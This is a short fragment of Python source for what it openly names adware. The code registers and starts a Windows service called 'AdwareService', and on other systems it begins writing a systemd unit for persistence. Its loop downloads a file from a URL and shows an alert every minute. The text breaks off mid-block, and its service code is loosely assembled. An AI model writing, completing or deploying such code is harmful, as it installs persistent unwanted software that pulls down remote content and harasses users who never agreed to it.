                        download_file(download_url)
                        show_alert(alert_url)
                        time.sleep(60)
                        if WaitForSingleObject(self.stop_event, 0) == 0:
                            break

                def SvcStop(self):
                    self.ReportServiceStatus(SERVICE_STOPPED)
                    WaitForSingleObject(self.stop_event, INFINITE)

            InstallService(AdwareService, 'AdwareService', 'Adware Service')
            StartService('AdwareService')
        else:
            with open('/etc/systemd/system/adware.service', 'w') as service_file:
